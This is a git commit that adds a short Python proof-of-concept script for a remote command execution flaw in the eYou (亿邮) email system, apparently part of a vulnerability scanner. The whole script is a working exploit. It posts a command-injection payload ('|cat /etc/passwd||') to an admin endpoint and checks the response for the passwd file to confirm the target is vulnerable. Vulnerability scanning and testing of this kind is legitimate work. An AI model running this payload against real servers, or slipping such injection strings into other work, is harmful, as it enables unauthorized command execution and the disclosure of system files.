7b0a7bd36103a062d1283ca0e592c3ace0752a6a
saucer-man <gyq0929@gmial.com>
2021-08-29 15:22:18 +0800

    add eyou rce

---
+++ scripts/eyou.py
@@ -0,0 +1,25 @@
+# 亿邮电子邮件系统 存在远程命令执行漏洞，攻击者可以执行任意命令
+# https://blog.csdn.net/qq_45742511/article/details/115734373
+
+
+import requests
+from plugin.target_parse import get_standard_url
+
+
+def poc(url):
+    if not url.startswith("http"):
+        url = "https://" + url
+    url = get_standard_url(url)
+    vuln_url = url + '/webadm/?q=moni_detail.do&action=gragh'
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    data= "type='|cat /etc/passwd||'"
+    try:
+        response1 = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
+        if response1.status_code == 200 and 'root:x:0:0' in response1.text:
+            return True
+
+    except Exception as e:
+        pass
+    return False
